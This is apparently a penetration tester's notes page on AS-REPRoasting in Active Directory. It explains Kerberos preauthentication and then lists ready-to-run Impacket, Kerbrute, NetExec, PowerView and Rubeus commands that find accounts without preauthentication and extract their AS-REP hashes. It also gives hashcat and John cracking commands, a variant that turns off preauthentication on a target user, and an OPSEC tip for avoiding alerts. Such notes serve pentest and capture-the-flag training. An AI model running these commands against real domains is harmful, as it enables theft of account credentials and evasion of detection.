# AS-REPRoasting

**AS-REPRoasting** is an attack on the initial Kerberos authentication step and it is usually performed **after obtaining a list of valid domain users**.&#x20;

**Preauthentication** is a security feature in Kerberos where the client must prove knowledge of their password before the KDC issues a TGT. This is done by encrypting a timestamp with a key derived from the user’s password and sending it to the KDC. If the KDC can decrypt and validate the timestamp, it confirms the user knows their password — protecting against offline brute-force attacks.

If an account has the [`Do not require Kerberos pre-authentication`](https://www.tenable.com/blog/how-to-stop-the-kerberos-pre-authentication-attack-in-active-directory) setting enabled then everyone can request from the DC to authenticate as that account and receive an **AS-REP**. The AS-REP contains the **TGT** which is encypted with the account's password hash which can be potentially cracked.

<figure><img src="../../../.gitbook/assets/asreproasting_process (2).png" alt=""><figcaption><p>Figure 1: The Kerberos authentication process (image taken from <a href="https://www.optiv.com/insights/source-zero/blog/kerberos-domains-achilles-heel">here</a>).</p></figcaption></figure>

## Tools <a href="#windows" id="windows"></a>

{% tabs %}
{% tab title="Linux" %}
Enumerate ASREPRoastable accounts using Impacket or Kerbrute:

{% code overflow="wrap" %}
```bash
# Impacket's GetNPUsers script
impacket-GetNPUsers <domain>/<user> -dc-ip <dc-ip>

# Kerbrute
kerbrute userenum -d <domain> --dc <dc-ip> /opt/jsmith.txt
```
{% endcode %}

Execute the attack using Impacket or NetExec:

{% code overflow="wrap" %}
```bash
# Impacket's GetNPUsers script targeting a list of users
impacket-GetNPUsers <domain>/ -dc-ip <dc-ip> -no-pass -usersfile users.txt

# Impacket's GetNPUsers script targeting a single user
impacket-GetNPUsers <domain>/<targetUser> -dc-ip <dc-ip> -no-pass

# NetExec
nxc ldap <dc-ip> -u users.txt -p '' --asreproast asreproast.lst
```
{% endcode %}

For an example of ASREPRoasting using `nxc` see [Sauna](https://x7331.gitbook.io/boxes/boxes/easy/sauna#asreproasting).
{% endtab %}

{% tab title="Windows" %}
Enumerate ASREPRoastable accounts using [PowerView](../ad-tools/powerview.md) or the [ActiveDirectory](https://learn.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2025-ps) module:

{% code overflow="wrap" %}
```powershell
# PowerView
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl

# AD module
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
```
{% endcode %}

Execute the attack using [Rubeus](../ad-tools/rubeus.md):

{% hint style="warning" %}
**OPSEC**: Try to attack a single user at a time as this is not seen as an anomaly and won't trigger alerts.
{% endhint %}

```powershell
# ASREPRoast all susceptible accounts
.\Rubeus.exe asreproast /nowrap /format:hashcat /outfile:<fileName>

# ASREPRoast a single account
.\Rubeus.exe asreproast /user:<user> /nowrap /format:hashcat /outfile:<fileName>
```
{% endtab %}
{% endtabs %}

The obtained hashes can be cracked using Hashcat or JtR:

```bash
# Hashcat
hashcat -m 18200 asreproast.lst /usr/share/wordlists/rockyou

# John
john --format=krb5asrep --wordlist=rockyou.txt --fork=4 asreproast.lst
```

## Targeted AS-REPRoast

If we can't find any vulnerable users, but we have `GenericWrite` or `GenericAll` on a user object, we can modify that user's `UserAccountControl` to disable preauthentication and then perform the ASREP roast attack. Don't forget to reset the `UserAccountControl` after extraction!

{% tabs %}
{% tab title="Windows" %}
Force disable Kerberos PreAuth using [PowerView](../ad-tools/powerview.md):

```powershell
Set-DomainObject -Identity <user> -XOR @{useraccountcontrol=4194304} -Verbose
```

Request encrypted AS-REP using [Rubeus](../ad-tools/rubeus.md):

{% code overflow="wrap" %}
```powershell
.\Rubeus.exe asreproast /user:<user> /outfile:<fileName> /nowrap /format:hashcat
```
{% endcode %}
{% endtab %}
{% endtabs %}

## Resources

* Some amazing demonstrations of AS-REPRoasting ([video](https://www.youtube.com/watch?v=EVdwnBFtUtQ), [video](https://www.youtube.com/watch?v=wA9w8t1fRWo))
* What `impacket-GetNPUsers` does behind the scenes ([video](https://www.youtube.com/watch?v=pZSyGRjHNO4))
